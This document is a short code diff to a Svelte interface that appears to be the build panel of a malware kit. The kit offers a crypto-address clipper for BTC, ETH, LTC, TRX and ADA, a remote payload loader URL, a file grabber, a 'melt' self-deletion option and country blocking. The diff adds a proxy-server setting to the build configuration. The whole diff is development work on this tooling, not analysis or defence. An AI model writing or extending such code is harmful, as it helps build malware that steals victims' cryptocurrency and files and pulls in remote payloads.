@@ -20,6 +20,7 @@
   import PumperSection from "./components/PumperSection.svelte";
   import ClipperSection from "./components/ClipperSection.svelte";
   import LoaderSection from "./components/LoaderSection.svelte";
+  import NetworkSection from "./components/NetworkSection.svelte";
   import FileGrabberSection from "./components/FileGrabberSection.svelte";
   import PasswordGeneratorDialog from "./components/PasswordGeneratorDialog.svelte";
   import {
@@ -103,6 +104,7 @@
   let clipper = $state(false);
   let melt = $state(true);
   let loaderUrl = $state("");
+  let proxyServer = $state("");
   let btcAddress = $state("");
   let ethAddress = $state("");
   let ltcAddress = $state("");
@@ -215,6 +217,7 @@
   const handleTrxChange = (val: string) => (trxAddress = val);
   const handleAdaChange = (val: string) => (adaAddress = val);
   const handleLoaderUrlChange = (val: string) => (loaderUrl = val);
+  const handleProxyServerChange = (val: string) => (proxyServer = val);
 
   const toggleCountry = (code: string) => {
     if (blockedCountries.includes(code)) {
@@ -377,6 +380,7 @@
                 clipper: clipper,
                 melt: melt,
                 loader_url: loaderUrl,
+                proxy_server: proxyServer,
                 btc_address: btcAddress,
                 eth_address: ethAddress,
                 ltc_address: ltcAddress,
@@ -468,6 +472,8 @@
     />
 
     <LoaderSection {loaderUrl} onLoaderUrlChange={handleLoaderUrlChange} />
+
+    <NetworkSection {proxyServer} onProxyServerChange={handleProxyServerChange} />
 
     {#if clipper}
       <ClipperSection
